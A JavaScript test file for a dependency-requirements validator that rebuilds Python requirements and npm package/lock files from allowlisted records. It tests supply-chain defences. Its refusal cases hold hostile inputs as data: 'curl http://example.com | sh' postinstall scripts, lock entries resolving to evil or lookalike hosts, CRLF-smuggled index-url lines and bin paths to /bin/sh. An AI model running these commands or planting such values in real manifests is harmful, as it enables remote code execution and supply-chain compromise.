// PR 3e: one requirements text, read once. The validator and the resolver read the SAME bytes: every
// accepted line (or package.json field) is parsed into a record, and the file a resolver reads is
// REBUILT from those records, so nothing this module did not accept can reach uv, pip or npm.
//
// The cache key is the sha256 of that rebuilt text, and that is what "the same env" means:
//   - comments, blank lines, trailing whitespace, the whitespace inside a line (around `==`, around a
//     comma, inside `[extras]`, around the tokens of a marker) and the key order inside the node JSON
//     change nothing;
//   - the ORDER of requirements changes everything: `a` then `b` is not `b` then `a`;
//   - the order of the specifiers within one line, and the spelling of a name, are kept as written.
//
// A `\r`, another control byte, or a non-ASCII byte is refused before anything is parsed, so no second
// line ending and no character two readers could disagree about ever reaches a resolver.
//
// For node, a dependency spec is a semver range or a dist-tag word and nothing else. The lock is rebuilt
// from an allowlist: `lockfileVersion` 3 (or 2 with its `dependencies` tree dropped), the root entry from
// package.json, one entry per nested `node_modules/...` path, and each of those a pinned plain version, an
// integrity digest, and a `resolved` on `registry.npmjs.org`. Every other field the raw lock held is
// dropped, so no link, git URL, path, foreign tarball or install script is handed to `npm ci`.
import { test, after } from "node:test";
import assert from "node:assert/strict";
import { EventEmitter } from "node:events";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  canonicalRequirements,
  ensureEnv,
  parseNodeRequirements,
  parsePythonRequirements,
  requirementsHash,
} from "../scripts/report-steps/env.mjs";

const root = mkdtempSync(join(tmpdir(), "crow-report-steps-req-"));
after(() => rmSync(root, { recursive: true, force: true }));

/** The parsed records of a python requirements text, or a failed assertion. */
const records = (text) => parsePythonRequirements(text);
/** The canonical text (what the resolver reads and the key hashes) of a python requirements text. */
const canonical = (text) => canonicalRequirements("python", text).text;
/** The file texts a node envelope rebuilds to. */
const nodeFiles = (pkg, lock) => canonicalRequirements("node", envelope(pkg, lock)).files;
/** The envelope one node requirements text is: both file texts, as the format spells them. */
const envelope = (pkg, lock, indent = 2) => JSON.stringify({
  "package.json": typeof pkg === "string" ? pkg : JSON.stringify(pkg, null, indent),
  "package-lock.json": typeof lock === "string" ? lock : JSON.stringify(lock, null, indent),
});

const LOCK = { lockfileVersion: 3, packages: {} };
/** A subresource integrity digest as the registry writes one. */
const INTEGRITY = "sha512-AAAbbbbCCCC1234+/==";
/** A lock entry for `left@1.2.3`, as the registry writes one, with whatever a test overrides. */
const lockEntry = (over = {}) => ({
  version: "1.2.3",
  resolved: "https://registry.npmjs.org/left/-/left-1.2.3.tgz",
  integrity: INTEGRITY,
  ...over,
});
/** A package.json for the lock tests. */
const PKG = { name: "step", version: "1.0.0", dependencies: { left: "^1.2.3" } };
/** A lock holding one entry under `key`. */
const oneEntry = (entry, key = "node_modules/left") => ({ lockfileVersion: 3, packages: { [key]: entry } });
/** Assert that a lock is refused, whatever it holds. */
const refusesLock = (lock, pkg = PKG, label = "") => assert.throws(
  () => canonicalRequirements("node", envelope(pkg, lock)), { code: "bad_requirements" }, label,
);

/* ------------------------------------------------------------------- what a line may say */

test("a line is a name, an extras list, version specifiers and an allowed marker", () => {
  assert.deepEqual(records("jinja2==3.1.4\n"), [{ name: "jinja2", extras: null, specs: ["==3.1.4"], marker: null }]);
  assert.deepEqual(records("requests[security]>=2.31,<3\n"), [
    { name: "requests", extras: "security", specs: [">=2.31", "<3"], marker: null },
  ]);
  assert.deepEqual(records('pyyaml ; python_version >= "3.9"\n'), [
    { name: "pyyaml", extras: null, specs: [], marker: 'python_version >= "3.9"' },
  ]);
  // The allowed operators, and the two-word one.
  for (const marker of ['python_version == "3.12"', 'os_name != "nt"', 'sys_platform in "linux"',
    'platform_machine not in "aarch64"', 'python_version >= "3.9" and os_name == "posix"',
    '(python_version >= "3.9" or extra == "docs") and platform_system == "Linux"']) {
    assert.equal(records(`jinja2; ${marker}`)[0].marker, marker);
  }
  // Comments are cut only at the start of a line or after whitespace, and blank lines are skipped.
  assert.equal(records("jinja2==3.1.4  # a trailing comment\n")[0].name, "jinja2");
  assert.equal(records("# a whole comment\n\n   \njinja2==3.1.4\n").length, 1);
  // Whitespace inside a line is not part of any record.
  assert.equal(canonical("  jinja2  ==  3.1.4  \t\n"), "jinja2==3.1.4\n");
  assert.equal(canonical("requests[ security ] >= 2.31 , < 3\n"), "requests[security]>=2.31,<3\n");
});

test("a second line ending, a control byte or a non-ASCII byte is refused before anything is parsed", () => {
  const bad = (text, label) => assert.throws(
    () => parsePythonRequirements(text), { code: "bad_requirements" }, label + ": " + JSON.stringify(text),
  );
  bad("jinja2==3.1.4\r--index-url https://example.com/simple\n", "a line smuggled with a carriage return");
  bad("jinja2==3.1.4\r\n--index-url https://example.com/simple\r\n", "an option line after a CRLF");
  bad("jinja2==3.1.4\u0000\n", "a NUL");
  bad("jinja2==3.1.4\u0007\n", "a bell");
  bad("jinja2\u2028requests==2.0\n", "a unicode line separator");
  bad("jinja2\u00e9==3.1.4\n", "a non-ASCII name");
});

test("options, URLs, paths, direct references and unknown markers are refused", () => {
  for (const text of [
    "-r other.txt\n",
    "-e .\n",
    "--index-url https://example.com/simple\n",
    "--find-links ./wheels\n",
    "--hash=sha256:0000\n",
    "https://example.com/x.whl\n",
    "http://example.com/x.whl\n",
    "foo @ https://example.com/x.whl\n",
    "./local-package\n",
    "/abs/path\n",
    "git+https://example.com/x\n",
    "foo==1.0#--index-url x\n",
    "foo==1.0; pip_version >= \"24\"\n",
    "foo==1.0; __import__(\"os\")\n",
    "foo==1.0; python_version >= \"3\" and\n",
    "foo==1.0; (python_version >= \"3\"\n",
  ]) {
    assert.throws(() => parsePythonRequirements(text), { code: "bad_requirements" }, JSON.stringify(text));
  }
});

/* ------------------------------------------------------------------ the rebuilt text */

test("valid files round-trip to the canonical text, and the canonical text round-trips to itself", () => {
  const text = "  # the report's deps\njinja2 == 3.1.4   # pinned\n\nrequests[security]>=2.31,<3\npyyaml;python_version>=\"3.9\"\n";
  const expected = 'jinja2==3.1.4\nrequests[security]>=2.31,<3\npyyaml; python_version >= "3.9"\n';
  assert.equal(canonical(text), expected);
  assert.deepEqual(canonicalRequirements("python", text).files, [{ name: "requirements.txt", text: expected }],
    "the resolver reads the rebuilt text and nothing else");
  assert.equal(canonical(expected), expected, "canonicalising a canonical text changes nothing");
  assert.deepEqual(records(expected), records(text), "and the records are the same records");
});

test("the cache key is the canonical text: whitespace and comments change nothing, order changes it", () => {
  const a = "jinja2==3.1.4\nrequests>=2.31\n";
  const spaced = "# deps\n\n  jinja2  ==  3.1.4  # pinned\n\trequests >= 2.31\t\n";
  assert.equal(canonical(spaced), canonical(a));
  assert.equal(requirementsHash(canonical(spaced)), requirementsHash(canonical(a)), "same records, same env");
  // Different order is a different text, so a different env.
  const reordered = "requests>=2.31\njinja2==3.1.4\n";
  assert.notEqual(canonical(reordered), canonical(a));
  assert.notEqual(requirementsHash(canonical(reordered)), requirementsHash(canonical(a)));
  // A different spec, or a different extras list, is a different text as well.
  assert.notEqual(requirementsHash(canonical("jinja2==3.1.5\n")), requirementsHash(canonical(a)));
  assert.notEqual(requirementsHash(canonical("requests[a]>=2.31\n")), requirementsHash(canonical("requests>=2.31\n")));
});

/* ---------------------------------------------------------------------------- node */

test("package.json is rebuilt from its name, version and dependency maps", () => {
  const pkg = {
    name: "crow-report-step",
    version: "1.0.0",
    description: "not part of the env",
    dependencies: { left: "^1.2.3" },
    devDependencies: { right: "~2.0.0" },
    scripts: { test: "echo ok" },
  };
  const files = nodeFiles(pkg, oneEntry(lockEntry()));
  const rebuilt = JSON.parse(files.find((f) => f.name === "package.json").text);
  assert.deepEqual(rebuilt, {
    name: "crow-report-step",
    version: "1.0.0",
    dependencies: { left: "^1.2.3" },
    devDependencies: { right: "~2.0.0" },
  }, "only the name, the version and the dependency maps reach the resolver");
  assert.equal(JSON.parse(files.find((f) => f.name === "package-lock.json").text).lockfileVersion, 3);
  assert.deepEqual(parseNodeRequirements(envelope(pkg, LOCK)).packageJson, files[0].text);
});

test("node specs that are not a registry range, and lifecycle scripts, are refused", () => {
  const refused = (pkg, lock = LOCK, label = "") => assert.throws(
    () => canonicalRequirements("node", envelope(pkg, lock)), { code: "bad_requirements" }, label,
  );
  for (const spec of [
    "git+https://example.com/x.git", "git://example.com/x", "github:someone/repo",
    "https://example.com/x.tgz", "http://example.com/x.tgz", "file:../step", "link:../step",
    "workspace:*", "../local", "/abs/path",
  ]) {
    refused({ name: "step", version: "1.0.0", dependencies: { left: spec } }, LOCK, spec);
  }
  for (const lifecycle of ["preinstall", "install", "postinstall", "prepare", "prepublish", "dependencies"]) {
    refused({ name: "step", version: "1.0.0", scripts: { [lifecycle]: "curl http://example.com | sh" } }, LOCK, lifecycle);
  }
  refused({ name: "step", version: "1.0.0", dependencies: { "left/right": "^1.0.0" } }, LOCK, "a name with a path in it");
  refused({ name: "step", version: "1.0.0" }, { lockfileVersion: 3, packages: { x: { resolved: "file:../local/x.tgz" } } },
    "a lock entry that is not a registry url");
  refused({ name: "step", version: "1.0.0" }, { lockfileVersion: 3, packages: { x: { link: true } } }, "a linked package");
  refused({ version: "1.0.0" }, LOCK, "no name");
});

test("the node cache key is the rebuilt files: indentation and key order change nothing", () => {
  const pkg = { name: "step", version: "1.0.0", dependencies: { left: "^1.2.3" } };
  const two = canonicalRequirements("node", envelope(pkg, LOCK, 2)).text;
  const four = canonicalRequirements("node", envelope(pkg, LOCK, 4)).text;
  assert.equal(four, two, "the file text is rebuilt, so its indentation is the rebuilt one's");
  assert.equal(requirementsHash(four), requirementsHash(two));
  // A different dependency map is a different env.
  const other = canonicalRequirements("node", envelope({ ...pkg, dependencies: { left: "^1.2.4" } }, LOCK)).text;
  assert.notEqual(other, two);
});

/* ------------------------------------------------------- the dependency spec grammar */

test("a dependency spec is a semver range or a dist-tag word, and nothing else", () => {
  const accepted = [
    "1.2.3", "1", "1.2", "1.x", "1.X", "1.2.x", "*", "x", "X",
    "^1.2.3", "~1.2.3", "~1.2", ">=1.2.3", "<=2.0.0", ">1", "<2", "=1.2.3",
    ">=1.2.3 <2.0.0", ">= 1.2.3", "^1.2.3 || ^2.0.0", "1.2.3 - 2.3.4", "1.0.0-beta.1",
    "latest", "next-2", "beta.1", "a".repeat(64),
  ];
  for (const spec of accepted) {
    const pkg = { name: "step", version: "1.0.0", dependencies: { left: spec } };
    assert.doesNotThrow(() => canonicalRequirements("node", envelope(pkg, LOCK)), JSON.stringify(spec));
  }
  const refused = [
    "git+https://example.com/x.git", "git://example.com/x", "github:someone/repo",
    "https://example.com/x.tgz", "http://example.com/x.tgz", "file:../step", "link:../step",
    "workspace:*", "workspace:^1.0.0", "user/repo", "../x", "./x", "~/x", "/abs/path",
    "npm:other@1", "@scope/name", "1.2.3/x", "\\\\server\\share", ">=", "^", "~", "",
    "latest!", "1.2.3.4", "01.2.3", "LATEST", "a".repeat(65),
  ];
  for (const spec of refused) {
    const pkg = { name: "step", version: "1.0.0", dependencies: { left: spec } };
    assert.throws(() => canonicalRequirements("node", envelope(pkg, LOCK)), { code: "bad_requirements" },
      JSON.stringify(spec));
  }
  assert.doesNotThrow(() => canonicalRequirements("node", envelope({ ...PKG, dependencies: { left: "~1.2.3" } }, LOCK)),
    "a tilde range is a range");
  assert.throws(() => canonicalRequirements("node", envelope({ ...PKG, dependencies: { left: "~/x" } }, LOCK)),
    { code: "bad_requirements" }, "a tilde path is not a range");
});

test("a package name is a lower-case npm name, scoped or not", () => {
  for (const name of ["left", "@scope/left", "a", "a.b_c-d", "x1", "0left"]) {
    assert.doesNotThrow(() => canonicalRequirements("node", envelope({ name, version: "1.0.0" }, LOCK)), name);
    assert.doesNotThrow(() => canonicalRequirements("node", envelope({ ...PKG, dependencies: { [name]: "1.0.0" } }, LOCK)), name);
  }
  for (const name of ["Left", "@Scope/left", ".hidden", "_private", "left/right", "@scope", "@scope/",
    "left name", "-left", "a".repeat(215)]) {
    assert.throws(() => canonicalRequirements("node", envelope({ name, version: "1.0.0" }, LOCK)),
      { code: "bad_requirements" }, JSON.stringify(name));
  }
});

/* ------------------------------------------------------------- the rebuilt lock */

test("a link, a path, a range or a foreign tarball in a lock entry refuses the whole lock", () => {
  const cases = [
    ["a linked package", lockEntry({ link: true })],
    ["a missing resolved", { version: "1.2.3", integrity: INTEGRITY }],
    ["a from field", lockEntry({ from: "../left" })],
    ["an inBundle flag", lockEntry({ inBundle: true })],
    ["a range where a version belongs", lockEntry({ version: "^1.2.3" })],
    ["a tag where a version belongs", lockEntry({ version: "latest" })],
    ["a git url where a version belongs", lockEntry({ version: "git+https://example.com/x.git" })],
    ["a partial version", lockEntry({ version: "1.2" })],
    ["a resolved on another host", lockEntry({ resolved: "https://evil.example.com/left/-/left-1.2.3.tgz" })],
    ["a resolved in a lookalike host", lockEntry({ resolved: "https://registry.npmjs.org.evil.example.com/x.tgz" })],
    ["an http resolved", lockEntry({ resolved: "http://registry.npmjs.org/left/-/left-1.2.3.tgz" })],
    ["a resolved with a port", lockEntry({ resolved: "https://registry.npmjs.org:8443/left/-/left-1.2.3.tgz" })],
    ["a resolved with credentials", lockEntry({ resolved: "https://user:pw@registry.npmjs.org/left/-/left-1.2.3.tgz" })],
    ["a file resolved", lockEntry({ resolved: "file:../local/left.tgz" })],
    ["a missing integrity", { version: "1.2.3", resolved: "https://registry.npmjs.org/left/-/left-1.2.3.tgz" }],
    ["a sha1 integrity", lockEntry({ integrity: "sha1-AAAbbbbCCCC1234+/==" })],
    ["a bare integrity algorithm", lockEntry({ integrity: "sha512-" })],
    ["an integrity with a space", lockEntry({ integrity: "sha512-AAA bbb" })],
    ["a non-string integrity", lockEntry({ integrity: 1234 })],
    ["a bin that leaves the package", lockEntry({ bin: { left: "../../../../bin/sh" } })],
    ["an absolute bin", lockEntry({ bin: { left: "/bin/sh" } })],
    ["a dependency on a git url", lockEntry({ dependencies: { right: "git+https://example.com/x.git" } })],
    ["a non-boolean dev flag", lockEntry({ dev: "yes" })],
  ];
  for (const [label, entry] of cases) refusesLock(oneEntry(entry), PKG, label);
});

test("a lock key is a nested node_modules path, and the root entry agrees with package.json", () => {
  for (const key of ["left", "../left", "node_modules/..", "node_modules/.", "node_modules/.hidden",
    "node_modules/../left", "node_modules/left/../../x", "node_modules/left/node_modules/..",
    "node_modules/Left", "node_modules/@scope", "node_modules/left/extra", "node_modules/left/"]) {
    refusesLock(oneEntry(lockEntry(), key), PKG, key);
  }
  assert.doesNotThrow(() => canonicalRequirements("node", envelope(PKG, oneEntry(lockEntry(),
    "node_modules/left/node_modules/@scope/right"))), "a nested scoped key is a key");

  // The root entry's dependency names must be package.json's own, map for map.
  const root = (maps) => ({ lockfileVersion: 3, packages: { "": { name: "step", version: "1.0.0", ...maps } } });
  assert.doesNotThrow(() => canonicalRequirements("node", envelope(PKG, root({ dependencies: { left: "^1.2.3" } }))));
  assert.doesNotThrow(() => canonicalRequirements("node", envelope(PKG, root({ dependencies: { left: "~9.9.9" } }))),
    "the range's spelling is package.json's, so the root's own copy is not what is written");
  refusesLock(root({ dependencies: { left: "^1.2.3", right: "^2.0.0" } }), PKG, "an extra dependency name");
  refusesLock(root({ dependencies: { right: "^2.0.0" } }), PKG, "another dependency name");
  refusesLock(root({}), PKG, "no dependency map at all");
  refusesLock(root({ dependencies: { left: "git+https://example.com/x.git" } }), PKG, "a git range at the root");
});

test("a v2 lock is accepted with its dependencies tree dropped, and a bad tree refuses it", () => {
  const packages = {
    "": { name: "step", version: "1.0.0", dependencies: { left: "^1.2.3" } },
    "node_modules/left": lockEntry({ dependencies: { right: "^2.0.0" } }),
    "node_modules/right": lockEntry({ version: "2.0.5", resolved: "https://registry.npmjs.org/right/-/right-2.0.5.tgz" }),
  };
  const tree = {
    left: {
      version: "1.2.3",
      resolved: "https://registry.npmjs.org/left/-/left-1.2.3.tgz",
      integrity: INTEGRITY,
      requires: { right: "^2.0.0" },
      dependencies: {
        right: { version: "2.0.5", resolved: "https://registry.npmjs.org/right/-/right-2.0.5.tgz", integrity: INTEGRITY },
      },
    },
  };
  const lock = { lockfileVersion: 2, name: "step", version: "1.0.0", requires: true, dependencies: tree, packages };
  const rebuilt = JSON.parse(nodeFiles(PKG, lock).find((f) => f.name === "package-lock.json").text);
  assert.deepEqual(Object.keys(rebuilt).sort(), ["lockfileVersion", "packages"], "only the packages map survives");
  assert.equal(rebuilt.lockfileVersion, 3, "a v2 lock is rebuilt as the packages map it already holds");
  assert.deepEqual(Object.keys(rebuilt.packages), ["", "node_modules/left", "node_modules/right"]);
  // The same tree, with one bad entry in it, refuses the lock rather than vanishing from it.
  refusesLock({ ...lock, dependencies: { left: { ...tree.left, link: true } } }, PKG, "a linked tree entry");
  refusesLock({ ...lock, dependencies: { left: { ...tree.left, resolved: "https://evil.example.com/left.tgz" } } },
    PKG, "a foreign tarball in the tree");
  refusesLock({ ...lock, dependencies: { left: { ...tree.left, version: "^1.2.3" } } }, PKG, "a range in the tree");
  refusesLock({ ...lock, dependencies: { left: { ...tree.left, integrity: "sha1-AAA" } } }, PKG, "a sha1 in the tree");

  // A v1 lock, and a lock with no packages map, have nothing this module can rebuild.
  for (const bad of [
    { lockfileVersion: 1, dependencies: tree },
    { lockfileVersion: 1, packages: {} },
    { lockfileVersion: 2 },
    { lockfileVersion: "3", packages: {} },
    { packages: {} },
    { lockfileVersion: 4, packages: {} },
  ]) {
    refusesLock(bad, PKG, JSON.stringify(bad).slice(0, 40));
  }
});

test("the rebuilt lock keeps only the allowed fields, and round-trips to a stable canonical text", () => {
  const pkg = {
    name: "step", version: "1.0.0", description: "dropped", private: true,
    dependencies: { left: "^1.2.3" }, devDependencies: { "@scope/right": "~2.0.0" },
  };
  const lock = {
    lockfileVersion: 3, name: "step", version: "1.0.0", requires: true, dependencies: {},
    packages: {
      "": {
        name: "step", version: "1.0.0", license: "MIT",
        dependencies: { left: "^1.2.3" }, devDependencies: { "@scope/right": "~2.0.0" },
      },
      "node_modules/left": lockEntry({
        license: "MIT", engines: { node: ">=14" }, bin: { left: "bin/left.js" }, hasInstallScript: true,
        funding: { url: "https://example.com/funding" }, deprecated: "an old one",
      }),
      "node_modules/@scope/right": {
        version: "2.0.5",
        resolved: "https://registry.npmjs.org/@scope/right/-/right-2.0.5.tgz",
        integrity: "sha256-AAAbbbCCCddd==",
        dev: true, os: ["linux"], cpu: ["x64", "arm64"], peerDependencies: { left: ">=1" },
      },
    },
  };
  const files = nodeFiles(pkg, lock);
  const packageText = files.find((f) => f.name === "package.json").text;
  const lockText = files.find((f) => f.name === "package-lock.json").text;
  assert.deepEqual(JSON.parse(packageText), {
    name: "step", version: "1.0.0",
    dependencies: { left: "^1.2.3" }, devDependencies: { "@scope/right": "~2.0.0" },
  });
  for (const dropped of ["description", "private"]) {
    assert.equal(packageText.includes(dropped), false, dropped);
  }
  const rebuilt = JSON.parse(lockText);
  assert.equal(rebuilt.lockfileVersion, 3);
  assert.deepEqual(Object.keys(rebuilt.packages), ["", "node_modules/@scope/right", "node_modules/left"]);
  assert.deepEqual(rebuilt.packages[""], {
    name: "step", version: "1.0.0",
    dependencies: { left: "^1.2.3" }, devDependencies: { "@scope/right": "~2.0.0" },
  }, "the root is rebuilt from package.json");
  for (const dropped of ["requires", "funding", "deprecated", "private", "description"]) {
    assert.equal(lockText.includes(dropped), false, dropped);
  }
  const left = rebuilt.packages["node_modules/left"];
  assert.deepEqual(left, {
    version: "1.2.3",
    resolved: "https://registry.npmjs.org/left/-/left-1.2.3.tgz",
    integrity: INTEGRITY,
    hasInstallScript: true,
    license: "MIT",
    engines: { node: ">=14" },
    bin: { left: "bin/left.js" },
  }, "bin and hasInstallScript are data; the env installs with --ignore-scripts");

  // The written files are the canonical text, and canonicalising them again changes nothing.
  const once = canonicalRequirements("node", envelope(pkg, lock)).text;
  assert.equal(canonicalRequirements("node", once).text, once, "a canonical text round-trips to itself");
  assert.equal(canonicalRequirements("node", envelope(pkg, JSON.parse(lockText))).text, once);
  assert.equal(requirementsHash(canonicalRequirements("node", once).text), requirementsHash(once));
});

/* ------------------------------------------------------------------ refused before a build */

test("ensureEnv refuses a smuggled requirements text before a wall is ever probed", async () => {
  let probes = 0;
  const outcome = await ensureEnv({
    reportId: "rpt-0123456789abcdef",
    language: "python",
    requirements: "jinja2==3.1.4\r\n--index-url https://example.com/simple\r\n",
    crowHome: "/nonexistent-crow-home",
    deps: { probe: () => { probes += 1; return { ok: false, reason: "the wall probe must not run" }; } },
  });
  assert.equal(outcome.ok, false);
  assert.equal(outcome.code, "bad_requirements");
  assert.equal(probes, 0, "the text was refused before anything was built");
});

/* --------------------------------------------------------------------- one build at a time */

/** The seams one stubbed build needs: a wall, a relay, a seccomp program and a child that exits 0. */
function buildSeams(calls, { delayMs = 0 } = {}) {
  return {
    probe: () => ({ ok: true, pidns: true, bwrap: "/usr/bin/bwrap" }),
    seccompSupported: () => true,
    buildSeccompProgram: () => Buffer.from([0x20, 0x00, 0x00, 0x00]),
    createRelay: ({ dir }) => ({ socketPath: join(dir, "relay.sock"), ready: Promise.resolve(), close: () => {} }),
    resolveUv: () => "/usr/bin/uv",
    spawn: (cmd, args, opts) => {
      calls.push({ cmd, args, opts });
      const child = new EventEmitter();
      child.pid = 7000 + calls.length;
      child.stderr = new EventEmitter();
      child.kill = () => {};
      setTimeout(() => child.emit("close", 0), delayMs);
      return child;
    },
  };
}

test("two concurrent ensureEnv calls for one report and language build once and share the answer", async () => {
  const home = join(root, "concurrent-home");
  const calls = [];
  const opts = {
    reportId: "rpt-0123456789abcdef",
    language: "python",
    requirements: "jinja2==3.1.4\n",
    crowHome: home,
    deps: { ...buildSeams(calls, { delayMs: 30 }), home },
  };
  const [one, two] = await Promise.all([ensureEnv(opts), ensureEnv(opts)]);
  assert.equal(one.ok, true, JSON.stringify(one));
  assert.deepEqual(two, one, "the waiter reuses the winner's result");
  assert.equal(calls.length, 2, "one build ran (one spawn per install step)");

  // The marker is there now, so the next caller builds nothing at all.
  const third = await ensureEnv(opts);
  assert.equal(third.built, false);
  assert.equal(calls.length, 2, "the cached env is answered without a build");
});

test("an env lock left by a dead process is stale and is taken over", async () => {
  const home = join(root, "stale-lock-home");
  const reportId = "rpt-0123456789abcdef";
  const envDir = join(home, "reports", reportId, "env", "python");
  const lockPath = envDir + ".lock";
  mkdirSync(join(home, "reports", reportId, "env"), { recursive: true });
  // A pid that is not running: nothing is waiting for it.
  writeFileSync(lockPath, JSON.stringify({ pid: 2147483646, at: Date.now() - 1000 }));
  const calls = [];
  const outcome = await ensureEnv({
    reportId,
    language: "python",
    requirements: "jinja2==3.1.4\n",
    crowHome: home,
    deps: { ...buildSeams(calls), home },
  });
  assert.equal(outcome.ok, true, JSON.stringify(outcome));
  assert.equal(outcome.built, true, "the stale lock did not block the build");
  assert.equal(calls.length, 2);
  assert.equal(existsSync(lockPath), false, "the lock is released when the build ends");
  assert.equal(existsSync(envDir), true, "and the env is in its place");
  assert.match(readFileSync(envDir + ".marker", "utf8"), /"hash"/);
});

test("a lock held by a live process is waited on, and the marker it leaves is reused", async () => {
  const home = join(root, "live-lock-home");
  const reportId = "rpt-0123456789abcdef";
  const envDir = join(home, "reports", reportId, "env", "python");
  const calls = [];
  // The first build finishes and leaves its marker; a second caller then finds the env there and
  // answers it, whatever a lock file says.
  const seams = buildSeams(calls);
  const first = await ensureEnv({
    reportId, language: "python", requirements: "jinja2==3.1.4\n", crowHome: home, deps: { ...seams, home },
  });
  assert.equal(first.ok, true, JSON.stringify(first));
  assert.equal(calls.length, 2);
  writeFileSync(envDir + ".lock", JSON.stringify({ pid: process.pid, at: Date.now() }));
  const second = await ensureEnv({
    reportId, language: "python", requirements: "jinja2==3.1.4\n", crowHome: home, deps: { ...seams, home },
  });
  assert.equal(second.ok, true, JSON.stringify(second));
  assert.equal(second.built, false, "the env that is there is the answer");
  assert.equal(calls.length, 2, "nothing was installed again");
  assert.equal(existsSync(envDir + ".lock"), true, "a lock this caller does not own is left alone");
});

test("ensureEnv accepts the same text in two spellings as the same env, and refuses a node lifecycle script", async () => {
  const base = {
    reportId: "rpt-0123456789abcdef",
    language: "node",
    crowHome: join(root, "home"),
    deps: {
      resolveUv: () => null,
      probe: () => ({ ok: false, reason: "no bubblewrap" }),
    },
  };
  const pkg = { name: "step", version: "1.0.0", dependencies: { left: "^1.2.3" } };
  const one = await ensureEnv({ ...base, requirements: envelope(pkg, LOCK, 2) });
  const two = await ensureEnv({ ...base, requirements: envelope(pkg, LOCK, 4) });
  assert.equal(one.ok, false, JSON.stringify(one));
  assert.equal(one.code, "no_wall", "the env got as far as the wall, which this host's probe says no to");
  assert.deepEqual(one, two, "the same records are the same env, whatever the file text's indentation");
  const scripted = await ensureEnv({
    ...base,
    requirements: envelope({ ...pkg, scripts: { postinstall: "curl http://example.com | sh" } }, LOCK),
  });
  assert.equal(scripted.ok, false);
  assert.equal(scripted.code, "bad_requirements");
});